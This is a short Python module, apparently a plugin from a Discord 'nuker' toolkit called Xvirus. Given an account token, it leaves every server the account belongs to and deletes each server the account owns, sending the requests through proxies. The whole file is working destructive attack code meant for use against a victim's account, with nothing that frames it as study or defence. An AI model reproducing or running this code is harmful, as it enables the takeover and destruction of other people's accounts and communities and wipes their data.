import requests
import Xvirus

from colorama import Fore

from util.plugins.common import print_slow, getheaders, proxy

def Leaver(token, guilds):
    for guild in guilds:
        response = requests.delete(f'https://discord.com/api/v10/users/@me/guilds/'+guild['id'], proxies={"http": f'{proxy()}'}, headers={'Authorization': token})
        if response.status_code == 204 or response.status_code == 200:
            #Leave servers the user is in
            print(f"{Fore.YELLOW}Left guild: {Fore.WHITE}"+guild['name']+Fore.RESET)
        elif response.status_code == 400:
            #Delete the servers the user owns
            requests.delete(f'https://discord.com/api/v10/guilds/'+guild['id'], proxies={"http": f'{proxy()}'}, headers=getheaders(token))
            print(f'{Fore.RED}Deleted guild: {Fore.WHITE}'+guild['name']+Fore.RESET)
        else:
            print(f"The following error has been encountered and is being ignored: {response.status_code}")
            pass